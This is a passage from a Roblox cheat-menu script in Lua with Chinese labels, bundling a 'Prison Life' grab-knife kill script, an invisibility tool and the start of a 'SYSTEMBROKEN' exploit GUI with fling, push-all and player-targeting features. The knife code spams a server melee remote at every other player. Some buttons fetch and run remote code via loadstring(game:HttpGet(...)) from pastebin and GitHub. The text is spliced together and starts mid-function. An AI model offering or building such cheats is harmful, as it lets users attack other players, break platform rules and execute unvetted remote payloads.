		elseif hurt == false and grabbed ~= nil and grabweld ~= nil and mode == "kill" and enabled2 == true then
			enabled2 = false
			enabled = false
			
			breaksound.Parent = grabbed
			breaksound:Play()
			
			for i=1, 5 do
				lw.C0 = lw.C0 * CFrame.new(0.02,0.15,-0.02) * CFrame.fromEulerAnglesXYZ(-0.05,0,-0.03)
				wait()
			end
			local duh = grabbed
			bleed(duh,1)
			bleed(duh,1)
			bleed(duh,1)
			bleed(duh,1)
			bleed(duh,1)				
			bleed(duh,1)
			bleed(duh,1)
			bleed(duh,1)
			bleed(duh,1)
			bleed(duh,1)
			wait(0.12)
			for i=1, 5 do
				lw.C0 = lw.C0 * CFrame.new(-0.02,-0.15,0.02) * CFrame.fromEulerAnglesXYZ(0.05,-0,0.03)
				wait()
			end
			
			
			if grabbed.Parent:findFirstChild("HumanoidRootPart",true) then
                        for i, plr in pairs(game.Players:GetChildren()) do
                        if plr.Name ~= game.Players.LocalPlayer.Name then
                        for i = 1, 10 do
                        game.ReplicatedStorage.meleeEvent:FireServer(plr)
                        end
                 end
          end
			end
			grabbed.Parent.Humanoid.Health = grabbed.Parent.Humanoid.Health / 1.5
			
		elseif hurt == false and grabbed ~= nil and grabweld ~= nil and mode == "drain" and enabled == true then
				enabled = false
				enabled2 = true
				
				for i=1, 2 do
					lw.C0 = lw.C0 * CFrame.new(0.06,0,-0.06) * CFrame.fromEulerAnglesXYZ(0.15,-0.11,-0.05)
					wait()
				end	

				while char.Humanoid.Health == char.Humanoid.MaxHealth do
					bleed(grabbed, 1)
					char.Humanoid.Health = char.Humanoid.Health + 1
					grabbed.Parent.Humanoid.Health = grabbed.Parent.Humanoid.Health - 1
					wait(0.0335)
				end
				
				for i=1, 1 do
					lw.C0 = lw.C0 * CFrame.new(-0.12,0,0.12) * CFrame.fromEulerAnglesXYZ(-0.3,0.22,0.05)
					wait()
				end
				enabled = true
				
				
		elseif hurt == false and grabbed ~= nil and grabweld ~= nil and mode == "throw" then
			enabled2 = true
			grabweld:remove()
			grabweld = nil
			local bf = Instance.new("BodyForce",grabbed)
			bf.force = torso.CFrame.lookVector * 4000
			bf.force = bf.force + Vector3.new(0,1500,0)
			coroutine.resume(coroutine.create(function()
				wait(0.12)
				bf:remove()
			end))
			for i=1, 6 do
				rw.C0 = rw.C0 * CFrame.new(0,0,0) * CFrame.fromEulerAnglesXYZ(0.35,0,0)
				lw.C0 = lw.C0 * CFrame.new(0,0,0) * CFrame.fromEulerAnglesXYZ(-0.18,0,0)
				wait()
			end
			for i=1, 4 do
				rw.C0 = rw.C0 * CFrame.new(0,0,0) * CFrame.fromEulerAnglesXYZ(-0.47,0,0)
				lw.C0 = lw.C0 * CFrame.new(0,0,0) * CFrame.fromEulerAnglesXYZ(0.2,0,0)
				wait()
			end
			wait(0.2)
			platlol = false
			grabbed = nil
			lolhum.PlatformStand = false
			lolhum = nil
			for i=1, 4 do
				rw.C0 = rw.C0 * CFrame.new(0.06,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.36,-0.08,0)
				lw.C0 = lw.C0 * CFrame.new(-0.12,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.3,0.2,0)
				wait()
			end
			lw.C0 = CFrame.new(0,0,0)
			rw.C0 = CFrame.new(0,0,0)
			lw.Part1 = nil
			rw.Part1 = nil
			attacking = false
			platlol = nil
		elseif hurt == false and grabbed ~= nil and lolhum ~= nil and grabweld ~= nil and mode == "para" then
			enabled2 = true
			killsound.Parent = grabbed
			killsound:Play()
			for i=1, 5 do
				lw.C0 = lw.C0 * CFrame.new(0.02,0.12,0.1) * CFrame.fromEulerAnglesXYZ(-0.05,0,-0.03)
				wait()
			end
			local ne = grabbed:findFirstChild("Neck")
			coroutine.resume(coroutine.create(function()
				local duh = grabbed
				local duh2 = grabbed.Parent.Head
				local lolas = lolhum
				duh.RotVelocity = Vector3.new(math.random(-20,20),math.random(-20,20),math.random(-20,20))
				for i=1, 75 do
					wait()
					local hm = math.random(1,15)
					pcall(function()
						if hm == 1 then
							duh2.Sound.Pitch = math.random(90,110)/100
							duh2.Sound:play()
							script.Parent.Splat:Play();
						end
					end)

					if hm > 0 and hm < 4 then

						bleed(duh,1)
						bleed(duh2,-0.1)
						bleed(duh,1)
						bleed(duh2,-0.1)
						bleed(duh,1)
						bleed(duh,1)
						bleed(duh,1)										
					end
				end
				wait(1.2)
				
				lolas.Health = 0
				for i=1, 85 do
					wait()
					local hm = math.random(1,9)
					pcall(function()
						if hm == 1 then
							duh2.Sound.Pitch = math.random(90,110)/100
							duh2.Sound:play()
						end
					end)
					if hm > 0 and hm < 3 then
						bleed(duh,1)
						bleed(duh2,-0.5)
					end
				end
			end))
			for i=1, 3 do
				lw.C0 = lw.C0 * CFrame.new(0.02,0.12,0.1) * CFrame.fromEulerAnglesXYZ(-0.05,0,-0.03)
				if ne ~= nil then
					grabbed.Neck.C0 = grabbed.Neck.C0 * CFrame.fromEulerAnglesXYZ(-0.35,0,0)
				end
				wait()
			end
			grabweld:remove()
			grabweld = nil
			for i=1, 4 do
				lw.C0 = lw.C0 * CFrame.new(-0.04,-0.24,-0.2) * CFrame.fromEulerAnglesXYZ(0.1,0,0.06)
				wait()
			end
			for i=1, 4 do
				rw.C0 = rw.C0 * CFrame.new(0.06,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.36,-0.08,0)
				lw.C0 = lw.C0 * CFrame.new(-0.12,0,0.12) * CFrame.fromEulerAnglesXYZ(-0.3,0.22,0.05)
				wait()
			end
			lw.C0 = CFrame.new(0,0,0)
			rw.C0 = CFrame.new(0,0,0)
			lw.Part1 = nil
			rw.Part1 = nil
			platlol = false
			grabbed = nil
			lolhum = nil
			attacking = false
			platlol = nil
		end
	end)
	mouse.KeyDown:connect(function(kai)
		key = kai:lower()
		if key == "q" then
			mode = "drop"
			inform("Fix Knife",1)
		elseif key == "e" then
			mode = "kill"
			inform("Kill",1)
		end
	end)
end

function desel()
	repeat wait() until attacking == false
	orr.Part1 = knife
	ar.Part1 = nil
end

bin.Selected:connect(select)
bin.Deselected:connect(desel)

char.Humanoid.Died:connect(function()
	pcall(function()
		grabweld:remove()
		grabweld = nil
		grabbed = nil
		platlol = false
		platlol = nil
	end)
end)

inform("Prison Life v2.0.2 Grab Knife Loaded | e = Kill /\ q = Fix Knife",3)
wait(3.2)
inform("Made By ASADCATONVERM :D", 2)

  	end    

})

Tab:AddButton({

	Name = "手里剑（部分游戏可攻击）",

	Callback = function()

     loadstring(game:HttpGet("https://pastebin.com/raw/mSLiAZHk"))()

  	end    

})

Tab:AddButton({

	Name = "装备隐身",

	Callback = function()

     local offset = 1100
local invisible = game.Players.LocalPlayer
local grips = {}
local heldTool
local gripChanged
local handle
local weld
function setDisplayDistance(distance)
    for _, player in pairs(game.Players:GetPlayers()) do
        if player.Character and player.Character:FindFirstChildWhichIsA("Humanoid") then
            player.Character:FindFirstChildWhichIsA("Humanoid").NameDisplayDistance = distance
            player.Character:FindFirstChildWhichIsA("Humanoid").HealthDisplayDistance = distance
        end
    end
end
local tool = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
tool.Name = "Invisible"
tool.RequiresHandle = false
tool.CanBeDropped = false
tool.Equipped:Connect(
    function()
        wait()
        if not invisible then
            invisible = true
            tool.Name = "Enabled Invisible"
            if handle then
                handle:Destroy()
            end
            if weld then
                weld:Destroy()
            end
            handle = Instance.new("Part", workspace)
            handle.Name = "Handle"
            handle.Transparency = 1
            handle.CanCollide = false
            handle.Size = Vector3.new(2, 1, 1)
            weld = Instance.new("Weld", handle)
            weld.Part0 = handle
            weld.Part1 = game.Players.LocalPlayer.Character.HumanoidRootPart
            weld.C0 = CFrame.new(0, offset - 1.5, 0)
            setDisplayDistance(offset + 100)
            workspace.CurrentCamera.CameraSubject = handle
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, offset, 0)
            game.Players.LocalPlayer.Character.Humanoid.HipHeight = offset
            game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
            for _, child in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                if child:IsA("Tool") and child ~= tool then
                    grips[child] = child.Grip
                end
            end
        elseif invisible then
            invisible = false
            tool.Name = "Disabled Invisible"
            if handle then
                handle:Destroy()
            end
            if weld then
                weld:Destroy()
            end
            for _, child in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                if child:IsA("Tool") then
                    child.Parent = game.Players.LocalPlayer.Backpack
                end
            end
            for tool, grip in pairs(grips) do
                if tool then
                    tool.Grip = grip
                end
            end
            heldTool = nil
            setDisplayDistance(100)
            workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, -offset, 0)
            game.Players.LocalPlayer.Character.Humanoid.HipHeight = 0
        end
        tool.Parent = game.Players.LocalPlayer.Backpack
    end
)
game.Players.LocalPlayer.Character.ChildAdded:Connect(
    function(child)
        wait()
        if invisible and child:IsA("Tool") and child ~= heldTool and child ~= tool then
            heldTool = child
            local lastGrip = heldTool.Grip
            if not grips[heldTool] then
                grips[heldTool] = lastGrip
            end
            for _, track in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
                track:Stop()
            end
            game.Players.LocalPlayer.Character.Animate.Disabled = true
            heldTool.Grip = heldTool.Grip * (CFrame.new(0, offset - 1.5, 1.5) * CFrame.Angles(math.rad(-90), 0, 0))
            heldTool.Parent = game.Players.LocalPlayer.Backpack
            heldTool.Parent = game.Players.LocalPlayer.Character
            if gripChanged then
                gripChanged:Disconnect()
            end
            gripChanged =
                heldTool:GetPropertyChangedSignal("Grip"):Connect(
                function()
                    wait()
                    if not invisible then
                        gripChanged:Disconnect()
                    end
                    if heldTool.Grip ~= lastGrip then
                        lastGrip =
                            heldTool.Grip * (CFrame.new(0, offset - 1.5, 1.5) * CFrame.Angles(math.rad(-90), 0, 0))
                        heldTool.Grip = lastGrip
                        heldTool.Parent = game.Players.LocalPlayer.Backpack
                        heldTool.Parent = game.Players.LocalPlayer.Character
                    end
                end
            )
        end
    end
)

  	end    

})

local Tab = Window:MakeTab({

    Name = "脚本后台",

    Icon = "rbxassetid://4483345998",

    PremiumOnly = false

})

Tab:AddButton({

	Name = "doors汉化",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/XSKMS/MS-Chinese-XXZ/refs/heads/main/rename.txt"))()

  	end    

})

Tab:AddButton({

	Name = "皇冠脚本（主要功能区四）",

	Callback = function()

     --RELOAD GUI
if game.CoreGui:FindFirstChild("SysBroker") then
	game:GetService("StarterGui"):SetCore("SendNotification", {Title = "System Broken",Text = "GUI Already loaded, rejoin to re-execute",Duration = 5;})
	return
end
local version = 2
--VARIABLES
_G.AntiFlingToggled = false
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local Light = game:GetService("Lighting")
local HttpService = game:GetService("HttpService")
local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
local mouse = plr:GetMouse()
local ScriptWhitelist = {}
local ForceWhitelist = {}
local TargetedPlayer = nil
local FlySpeed = 50
local PotionTool = nil
local SavedCheckpoint = nil
local MinesFolder = nil
local FreeEmotesEnabled = false
local CannonsFolders = {}

pcall(function()
	MinesFolder = game:GetService("Workspace").Landmines
	for i,v in pairs(game:GetService("Workspace"):GetChildren()) do
		if v.Name == "Cannons" then
			table.insert(CannonsFolders, v)
		end
	end
end)
--FUNCTIONS
_G.shield = function(id)
	if not table.find(ForceWhitelist,id) then
		table.insert(ForceWhitelist, id)
	end
end

local function RandomChar()
	local length = math.random(1,5)
	local array = {}
	for i = 1, length do
		array[i] = string.char(math.random(32, 126))
	end
	return table.concat(array)
end

local function ChangeToggleColor(Button)
	led = Button.Ticket_Asset
	if led.ImageColor3 == Color3.fromRGB(255, 0, 0) then
		led.ImageColor3 = Color3.fromRGB(0, 255, 0)
	else
		led.ImageColor3 = Color3.fromRGB(255, 0, 0)
	end
end

local function GetPing()
	return (game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())/1000
end

local function GetPlayer(UserDisplay)
	if UserDisplay ~= "" then
        for i,v in pairs(Players:GetPlayers()) do
            if v.Name:lower():match(UserDisplay) or v.DisplayName:lower():match(UserDisplay) then
                return v
            end
        end
		return nil
	else
		return nil
    end
end

local function GetCharacter(Player)
	if Player.Character then
		return Player.Character
	end
end

local function GetRoot(Player)
	if GetCharacter(Player):FindFirstChild("HumanoidRootPart") then
		return GetCharacter(Player).HumanoidRootPart
	end
end

local function TeleportTO(posX,posY,posZ,player,method)
	pcall(function()
		if method == "safe" then
			task.spawn(function()
				for i = 1,30 do
					task.wait()
					GetRoot(plr).Velocity = Vector3.new(0,0,0)
					if player == "pos" then
						GetRoot(plr).CFrame = CFrame.new(posX,posY,posZ)
					else
						GetRoot(plr).CFrame = CFrame.new(GetRoot(player).Position)+Vector3.new(0,2,0)
					end
				end
			end)
		else
			GetRoot(plr).Velocity = Vector3.new(0,0,0)
			if player == "pos" then
				GetRoot(plr).CFrame = CFrame.new(posX,posY,posZ)
			else
				GetRoot(plr).CFrame = CFrame.new(GetRoot(player).Position)+Vector3.new(0,2,0)
			end
		end
	end)
end

local function PredictionTP(player,method)
	local root = GetRoot(player)
	local pos = root.Position
	local vel = root.Velocity
	GetRoot(plr).CFrame = CFrame.new((pos.X)+(vel.X)*(GetPing()*3.5),(pos.Y)+(vel.Y)*(GetPing()*2),(pos.Z)+(vel.Z)*(GetPing()*3.5))
	if method == "safe" then
		task.wait()
		GetRoot(plr).CFrame = CFrame.new(pos)
		task.wait()
		GetRoot(plr).CFrame = CFrame.new((pos.X)+(vel.X)*(GetPing()*3.5),(pos.Y)+(vel.Y)*(GetPing()*2),(pos.Z)+(vel.Z)*(GetPing()*3.5))
	end
end

local function Touch(x,root)
	pcall(function()
		x = x:FindFirstAncestorWhichIsA("Part")
		if x then
			if firetouchinterest then
				task.spawn(function()
					firetouchinterest(x, root, 1)
					task.wait()
					firetouchinterest(x, root, 0)
				end)
			end
		end
	end)
end


local function GetPush()
	local TempPush = nil
	pcall(function()
		if plr.Backpack:FindFirstChild("Push") then
			PushTool = plr.Backpack.Push
			PushTool.Parent = plr.Character
			TempPush = PushTool
		end
		for i,v in pairs(Players:GetPlayers()) do
			if v.Character:FindFirstChild("Push") then
				TempPush = v.Character.Push
			end
		end
	end)
	return TempPush
end

local function CheckPotion()
	if plr.Backpack:FindFirstChild("potion") then
		PotionTool = plr.Backpack:FindFirstChild("potion")
		return true
	elseif plr.Character:FindFirstChild("potion") then
		PotionTool = plr.Character:FindFirstChild("potion")
		return true
	else
		return false
	end
end

local function Push(Target)
	local Push = GetPush()
	local FixTool = nil
	if Push ~= nil then
		local args = {[1] = Target.Character}
		GetPush().PushTool:FireServer(unpack(args))
	end
	if plr.Character:FindFirstChild("Push") then
		plr.Character.Push.Parent = plr.Backpack
	end
	if plr.Character:FindFirstChild("ModdedPush") then
		FixTool = plr.Character:FindFirstChild("ModdedPush")
		FixTool.Parent = plr.Backpack
		FixTool.Parent = plr.Character
	end
	if plr.Character:FindFirstChild("ClickTarget") then
		FixTool = plr.Character:FindFirstChild("ClickTarget")
		FixTool.Parent = plr.Backpack
		FixTool.Parent = plr.Character
	end
	if plr.Character:FindFirstChild("potion") then
		FixTool = plr.Character:FindFirstChild("potion")
		FixTool.Parent = plr.Backpack
		FixTool.Parent = plr.Character
	end
end

local function ToggleRagdoll(bool)
	pcall(function()
		plr.Character["Falling down"].Disabled = bool
		plr.Character["Swimming"].Disabled = bool
		plr.Character["StartRagdoll"].Disabled = bool
		plr.Character["Pushed"].Disabled = bool
		plr.Character["RagdollMe"].Disabled = bool
	end)
end

local function ToggleVoidProtection(bool)
	if bool then
		game.Workspace.FallenPartsDestroyHeight = 0/0
	else
		game.Workspace.FallenPartsDestroyHeight = -500
	end
end

local function PlayAnim(id,time,speed)
	pcall(function()
		plr.Character.Animate.Disabled = false
		local hum = plr.Character.Humanoid
		local animtrack = hum:GetPlayingAnimationTracks()
		for i,track in pairs(animtrack) do
			track:Stop()
		end
		plr.Character.Animate.Disabled = true
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://"..id
		local loadanim = hum:LoadAnimation(Anim)
		loadanim:Play()
		loadanim.TimePosition = time
		loadanim:AdjustSpeed(speed)
		loadanim.Stopped:Connect(function()
			plr.Character.Animate.Disabled = false
			for i, track in pairs (animtrack) do
        		track:Stop()
    		end
		end)
	end)
end

local function StopAnim()
	plr.Character.Animate.Disabled = false
    local animtrack = plr.Character.Humanoid:GetPlayingAnimationTracks()
    for i, track in pairs (animtrack) do
        track:Stop()
    end
end

local function SendNotify(title, message, duration)
	game:GetService("StarterGui"):SetCore("SendNotification", {Title = title,Text = message,Duration = duration;})
end

--LOAD GUI
task.wait(0.1)
local SysBroker = Instance.new("ScreenGui")
local Background = Instance.new("ImageLabel")
local TitleBarLabel = Instance.new("TextLabel")
local SectionList = Instance.new("Frame")
local Home_Section_Button = Instance.new("TextButton")
local Game_Section_Button = Instance.new("TextButton")
local Character_Section_Button = Instance.new("TextButton")
local Target_Section_Button = Instance.new("TextButton")
local Animations_Section_Button = Instance.new("TextButton")
local Misc_Section_Button = Instance.new("TextButton")
local Credits_Section_Button = Instance.new("TextButton")
local Game_Section = Instance.new("ScrollingFrame")
local AntiRagdoll_Button = Instance.new("TextButton")
local PotionFling_Button = Instance.new("TextButton")
local SpamMines_Button = Instance.new("TextButton")
local PushAura_Button = Instance.new("TextButton")
local BreakCannons_Button = Instance.new("TextButton")
local LethalCannons_Button = Instance.new("TextButton")
local ChatAlert_Button = Instance.new("TextButton")
local PotionDi_Button = Instance.new("TextButton")
local VoidProtection_Button = Instance.new("TextButton")
local PushAll_Button = Instance.new("TextButton")
local TouchFling_Button = Instance.new("TextButton")
local CMDBar = Instance.new("TextBox")
local CannonTP1_Button = Instance.new("TextButton")
local CannonTP2_Button = Instance.new("TextButton")
local CannonTP3_Button = Instance.new("TextButton")
local MinefieldTP_Button = Instance.new("TextButton")
local BallonTP_Button = Instance.new("TextButton")
local NormalStairsTP_Button = Instance.new("TextButton")
local MovingStairsTP_Button = Instance.new("TextButton")
local SpiralStairsTP_Button = Instance.new("TextButton")
local SkyscraperTP_Button = Instance.new("TextButton")
local PoolTP_Button = Instance.new("TextButton")
local FreePushTool_Button = Instance.new("TextButton")
local Home_Section = Instance.new("ScrollingFrame")
local Profile_Image = Instance.new("ImageLabel")
local Welcome_Label = Instance.new("TextLabel")
local Announce_Label = Instance.new("TextLabel")
local Character_Section = Instance.new("ScrollingFrame")
local WalkSpeed_Button = Instance.new("TextButton")
local WalkSpeed_Input = Instance.new("TextBox")
local ClearCheckpoint_Button = Instance.new("TextButton")
local JumpPower_Input = Instance.new("TextBox")
local JumpPower_Button = Instance.new("TextButton")
local SaveCheckpoint_Button = Instance.new("TextButton")
local Respawn_Button = Instance.new("TextButton")
local FlySpeed_Button = Instance.new("TextButton")
local FlySpeed_Input = Instance.new("TextBox")
local Fly_Button = Instance.new("TextButton")
local Target_Section = Instance.new("ScrollingFrame")
local TargetImage = Instance.new("ImageLabel")
local ClickTargetTool_Button = Instance.new("ImageButton")
local TargetName_Input = Instance.new("TextBox")
local UserIDTargetLabel = Instance.new("TextLabel")
local ViewTarget_Button = Instance.new("TextButton")
local FlingTarget_Button = Instance.new("TextButton")
local FocusTarget_Button = Instance.new("TextButton")
local BenxTarget_Button = Instance.new("TextButton")
local PushTarget_Button = Instance.new("TextButton")
local WhitelistTarget_Button = Instance.new("TextButton")
local TeleportTarget_Button = Instance.new("TextButton")
local HeadsitTarget_Button = Instance.new("TextButton")
local StandTarget_Button = Instance.new("TextButton")
local BackpackTarget_Button = Instance.new("TextButton")
local DoggyTarget_Button = Instance.new("TextButton")
local DragTarget_Button = Instance.new("TextButton")
local Animations_Section = Instance.new("ScrollingFrame")
local VampireAnim_Button = Instance.new("TextButton")
local HeroAnim_Button = Instance.new("TextButton")
local ZombieClassicAnim_Button = Instance.new("TextButton")
local MageAnim_Button = Instance.new("TextButton")
local GhostAnim_Button = Instance.new("TextButton")
local ElderAnim_Button = Instance.new("TextButton")
local LevitationAnim_Button = Instance.new("TextButton")
local AstronautAnim_Button = Instance.new("TextButton")
local NinjaAnim_Button = Instance.new("TextButton")
local WerewolfAnim_Button = Instance.new("TextButton")
local CartoonAnim_Button = Instance.new("TextButton")
local PirateAnim_Button = Instance.new("TextButton")
local SneakyAnim_Button = Instance.new("TextButton")
local ToyAnim_Button = Instance.new("TextButton")
local KnightAnim_Button = Instance.new("TextButton")
--NEWS
local ConfidentAnim_Button = Instance.new("TextButton")
local PopstarAnim_Button = Instance.new("TextButton")
local PrincessAnim_Button = Instance.new("TextButton")
local CowboyAnim_Button = Instance.new("TextButton")
local PatrolAnim_Button = Instance.new("TextButton")
local ZombieFEAnim_Button = Instance.new("TextButton")
--NEWS
local Misc_Section = Instance.new("ScrollingFrame")
local AntiFling_Button = Instance.new("TextButton")
local AntiChatSpy_Button = Instance.new("TextButton")
local AntiAFK_Button = Instance.new("TextButton")
local Shaders_Button = Instance.new("TextButton")
local Day_Button = Instance.new("TextButton")
local Night_Button = Instance.new("TextButton")
local Rejoin_Button = Instance.new("TextButton")
local CMDX_Button = Instance.new("TextButton")
local InfYield_Button = Instance.new("TextButton")
local Serverhop_Button = Instance.new("TextButton")
local Explode_Button = Instance.new("TextButton")
local FreeEmotes_Button = Instance.new("TextButton")
local ChatBox_Input = Instance.new("TextBox")
local Credits_Section = Instance.new("ScrollingFrame")
local Credits_Label = Instance.new("TextLabel")
local Crown = Instance.new("ImageLabel")
local Assets = Instance.new("Folder")
local Ticket_Asset = Instance.new("ImageButton")
local Click_Asset = Instance.new("ImageButton")
local Velocity_Asset = Instance.new("BodyAngularVelocity")
local Fly_Pad = Instance.new("ImageButton")
local UIGradient = Instance.new("UIGradient")
local FlyAButton = Instance.new("TextButton")
local FlyDButton = Instance.new("TextButton")
local FlyWButton = Instance.new("TextButton")
local FlySButton = Instance.new("TextButton")
local OpenClose = Instance.new("ImageButton")
local UICornerOC = Instance.new("UICorner")

local function CreateToggle(Button)
	local NewToggle = Ticket_Asset:Clone()
	NewToggle.Parent = Button
end

local function CreateClicker(Button)
	local NewClicker = Click_Asset:Clone()
	NewClicker.Parent = Button
end

SysBroker.Name = "SysBroker"
SysBroker.Parent = game.CoreGui
SysBroker.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Background.Name = "Background"
Background.Parent = SysBroker
Background.AnchorPoint = Vector2.new(0.5, 0.5)
Background.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Background.BorderColor3 = Color3.fromRGB(0, 255, 255)
Background.Position = UDim2.new(0.5, 0, 0.5, 0)
Background.Size = UDim2.new(0, 500, 0, 350)
Background.ZIndex = 9
Background.Image = "rbxassetid://159991693"
Background.ImageColor3 = Color3.fromRGB(0, 255, 255)
Background.ImageTransparency = 0.600
Background.ScaleType = Enum.ScaleType.Tile
Background.SliceCenter = Rect.new(0, 256, 0, 256)
Background.TileSize = UDim2.new(0, 30, 0, 30)
Background.Active = true
Background.Draggable = true

TitleBarLabel.Name = "TitleBarLabel"
TitleBarLabel.Parent = Background
TitleBarLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TitleBarLabel.BackgroundTransparency = 0.250
TitleBarLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TitleBarLabel.BorderSizePixel = 0
TitleBarLabel.Size = UDim2.new(1, 0, 0, 30)
TitleBarLabel.Font = Enum.Font.Unknown
TitleBarLabel.Text = "____/SYSTEMBROKEN\\___"
TitleBarLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
TitleBarLabel.TextScaled = true
TitleBarLabel.TextSize = 14.000
TitleBarLabel.TextWrapped = true
TitleBarLabel.TextXAlignment = Enum.TextXAlignment.Left

SectionList.Name = "SectionList"
SectionList.Parent = Background
SectionList.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SectionList.BackgroundTransparency = 0.500
SectionList.BorderColor3 = Color3.fromRGB(0, 0, 0)
SectionList.BorderSizePixel = 0
SectionList.Position = UDim2.new(0, 0, 0, 30)
SectionList.Size = UDim2.new(0, 105, 0, 320)

Home_Section_Button.Name = "Home_Section_Button"
Home_Section_Button.Parent = SectionList
Home_Section_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Home_Section_Button.BackgroundTransparency = 0.500
Home_Section_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Home_Section_Button.BorderSizePixel = 0
Home_Section_Button.Position = UDim2.new(0, 0, 0, 25)
Home_Section_Button.Size = UDim2.new(0, 105, 0, 30)
Home_Section_Button.Font = Enum.Font.Oswald
Home_Section_Button.Text = "Home"
Home_Section_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Home_Section_Button.TextScaled = true
Home_Section_Button.TextSize = 14.000
Home_Section_Button.TextWrapped = true

Game_Section_Button.Name = "Game_Section_Button"
Game_Section_Button.Parent = SectionList
Game_Section_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Game_Section_Button.BackgroundTransparency = 0.500
Game_Section_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Game_Section_Button.BorderSizePixel = 0
Game_Section_Button.Position = UDim2.new(0, 0, 0, 65)
Game_Section_Button.Size = UDim2.new(0, 105, 0, 30)
Game_Section_Button.Font = Enum.Font.Oswald
Game_Section_Button.Text = "Game"
Game_Section_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Game_Section_Button.TextScaled = true
Game_Section_Button.TextSize = 14.000
Game_Section_Button.TextWrapped = true

Character_Section_Button.Name = "Character_Section_Button"
Character_Section_Button.Parent = SectionList
Character_Section_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Character_Section_Button.BackgroundTransparency = 0.500
Character_Section_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Character_Section_Button.BorderSizePixel = 0
Character_Section_Button.Position = UDim2.new(0, 0, 0, 105)
Character_Section_Button.Size = UDim2.new(0, 105, 0, 30)
Character_Section_Button.Font = Enum.Font.Oswald
Character_Section_Button.Text = "Character"
Character_Section_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Character_Section_Button.TextScaled = true
Character_Section_Button.TextSize = 14.000
Character_Section_Button.TextWrapped = true

Target_Section_Button.Name = "Target_Section_Button"
Target_Section_Button.Parent = SectionList
Target_Section_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Target_Section_Button.BackgroundTransparency = 0.500
Target_Section_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Target_Section_Button.BorderSizePixel = 0
Target_Section_Button.Position = UDim2.new(0, 0, 0, 145)
Target_Section_Button.Size = UDim2.new(0, 105, 0, 30)
Target_Section_Button.Font = Enum.Font.Oswald
Target_Section_Button.Text = "Target"
Target_Section_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Target_Section_Button.TextScaled = true
Target_Section_Button.TextSize = 14.000
Target_Section_Button.TextWrapped = true

Animations_Section_Button.Name = "Animations_Section_Button"
Animations_Section_Button.Parent = SectionList
Animations_Section_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Animations_Section_Button.BackgroundTransparency = 0.500
Animations_Section_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Animations_Section_Button.BorderSizePixel = 0
Animations_Section_Button.Position = UDim2.new(0, 0, 0, 185)
Animations_Section_Button.Size = UDim2.new(0, 105, 0, 30)
Animations_Section_Button.Font = Enum.Font.Oswald
Animations_Section_Button.Text = "Animations"
Animations_Section_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Animations_Section_Button.TextScaled = true
Animations_Section_Button.TextSize = 14.000
Animations_Section_Button.TextWrapped = true

Misc_Section_Button.Name = "Misc_Section_Button"
Misc_Section_Button.Parent = SectionList
Misc_Section_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Misc_Section_Button.BackgroundTransparency = 0.500
Misc_Section_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Misc_Section_Button.BorderSizePixel = 0
Misc_Section_Button.Position = UDim2.new(0, 0, 0, 225)
Misc_Section_Button.Size = UDim2.new(0, 105, 0, 30)
Misc_Section_Button.Font = Enum.Font.Oswald
Misc_Section_Button.Text = "Misc"
Misc_Section_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Misc_Section_Button.TextScaled = true
Misc_Section_Button.TextSize = 14.000
Misc_Section_Button.TextWrapped = true

Credits_Section_Button.Name = "Credits_Section_Button"
Credits_Section_Button.Parent = SectionList
Credits_Section_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Credits_Section_Button.BackgroundTransparency = 0.500
Credits_Section_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Credits_Section_Button.BorderSizePixel = 0
Credits_Section_Button.Position = UDim2.new(0, 0, 0, 265)
Credits_Section_Button.Size = UDim2.new(0, 105, 0, 30)
Credits_Section_Button.Font = Enum.Font.Oswald
Credits_Section_Button.Text = "Credits"
Credits_Section_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Credits_Section_Button.TextScaled = true
Credits_Section_Button.TextSize = 14.000
Credits_Section_Button.TextWrapped = true

Game_Section.Name = "Game_Section"
Game_Section.Parent = Background
Game_Section.Active = true
Game_Section.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Game_Section.BackgroundTransparency = 1.000
Game_Section.BorderColor3 = Color3.fromRGB(0, 0, 0)
